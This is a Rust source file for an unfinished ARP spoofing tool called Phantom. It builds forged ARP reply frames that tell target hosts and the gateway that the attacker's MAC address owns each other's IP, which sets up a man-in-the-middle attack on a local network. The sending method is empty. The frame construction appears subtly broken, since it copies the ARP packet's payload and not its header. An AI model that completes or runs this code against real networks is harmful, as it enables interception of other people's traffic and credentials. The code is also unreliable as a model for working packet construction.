use std::net::Ipv4Addr;

use pnet::{
    datalink::{self, DataLinkSender, NetworkInterface},
    packet::{
        arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket},
        ethernet::{EtherTypes, MutableEthernetPacket},
        Packet,
    },
    util::MacAddr,
};

pub struct Phantom {
    interface: NetworkInterface,
    sender: Box<dyn DataLinkSender>,
    gateway: Vec<Vec<u8>>, // * Spoofed packets to send to the gateway
    target: Vec<Vec<u8>>, // * Spoofed Packets to send to the targets
}

// * pdst is where ARP packet should go (IP,target)
// * psrc The IP to update on ^ Table
// * hwsrc MAC for ^
// * hwdst destination hardware address. Only use when it-at is sent (op=2)

impl Phantom {
    pub async fn poison(&mut self) {
        
    }
    pub fn new(
        iface_name: &str,
        targets: Vec<(Ipv4Addr, MacAddr)>,
        gateway: (Ipv4Addr, MacAddr),
    ) -> Phantom {
        let ifaces = datalink::interfaces();
        let iface = ifaces
            .iter()
            .find(|f| f.name == iface_name && !f.is_loopback())
            .unwrap();
        /*
        let myip = match iface
        .ips
        .iter()
        .find(|ip| !ip.ip().is_loopback())
        .expect("No IP's Found")
        .ip()
        {
            std::net::IpAddr::V4(ipv4) => ipv4,
            std::net::IpAddr::V6(_) => panic!("Only IPV6 Found :("),
        }; 
        */
        // ! Pre Calculate All The Packets
        let mymac = iface.mac.unwrap();
        
        let mut target_packets: Vec<Vec<u8>> = vec![];
        let mut gateway_packets: Vec<Vec<u8>> = vec![];

        for (ip, mac) in targets.clone() { // ! SPOOF TARGETS
            /*
            * ip's ARP Table After Poisoning
            ! +-----IP-----+--MAC--+
            ! | gateway ip | mymac |
            ! +------------+-------+
             */
            let mut ebuffer = [0u8; 42];
            let mut ethernet_packet =
                MutableEthernetPacket::new(&mut ebuffer).expect("Unable to create ethernet frame");

            ethernet_packet.set_destination(mac);
            ethernet_packet.set_source(mymac);
            ethernet_packet.set_ethertype(EtherTypes::Arp);

            let mut abuffer = [0u8; 28];
            let mut arp_packet = MutableArpPacket::new(&mut abuffer).unwrap();

            arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
            arp_packet.set_protocol_type(EtherTypes::Ipv4);
            arp_packet.set_hw_addr_len(6);
            arp_packet.set_proto_addr_len(4);
            arp_packet.set_operation(ArpOperations::Reply);

            arp_packet.set_target_proto_addr(ip); // * where ARP packet should go (IP,target)
            arp_packet.set_sender_proto_addr(gateway.0); // * The IP to update on ^ Table
            arp_packet.set_sender_hw_addr(mymac); // * MAC for ^
            arp_packet.set_target_hw_addr(mac); // * destination hardware address. Only use when it-at is sent (op=2)

            ethernet_packet.set_payload(arp_packet.payload());
            target_packets.push(ethernet_packet.packet().to_vec())
        };
        
        for (ip, _mac) in targets { // ! SPOOF GATEWAY
            /* 
            * Gateway's ARP Table After Poisoning
            ! +-IP-+--MAC--+
            ! | ip | mymac |
            ! +----+-------+
            */
            let mut ebuffer = [0u8; 42];
            let mut ethernet_packet =
                MutableEthernetPacket::new(&mut ebuffer).expect("Unable to create ethernet frame");

            ethernet_packet.set_destination(gateway.1);
            ethernet_packet.set_source(mymac);
            ethernet_packet.set_ethertype(EtherTypes::Arp);

            let mut abuffer = [0u8; 28];
            let mut arp_packet = MutableArpPacket::new(&mut abuffer).unwrap();

            arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
            arp_packet.set_protocol_type(EtherTypes::Ipv4);
            arp_packet.set_hw_addr_len(6);
            arp_packet.set_proto_addr_len(4);
            arp_packet.set_operation(ArpOperations::Reply);

            arp_packet.set_target_proto_addr(gateway.0); // * where ARP packet should go (IP,target)
            arp_packet.set_sender_proto_addr(ip); // * The IP to update on ^ Table
            arp_packet.set_sender_hw_addr(mymac); // * MAC for ^
            arp_packet.set_target_hw_addr(gateway.1); // * destination hardware address. Only use when it-at is sent (op=2)

            ethernet_packet.set_payload(arp_packet.payload());
            gateway_packets.push(ethernet_packet.packet().to_vec())
        };
        let (tx,_rx) = match datalink::channel(&iface, Default::default()) {
            Ok(datalink::Channel::Ethernet(tx, rx)) => (tx,rx),
            Ok(_) => panic!("Unknown channel type"),
            Err(e) => panic!("Error: {e}")
        };
        Phantom {
            interface: iface.clone(),
            sender: tx,
            gateway: gateway_packets,
            target: target_packets
        }
    }
}
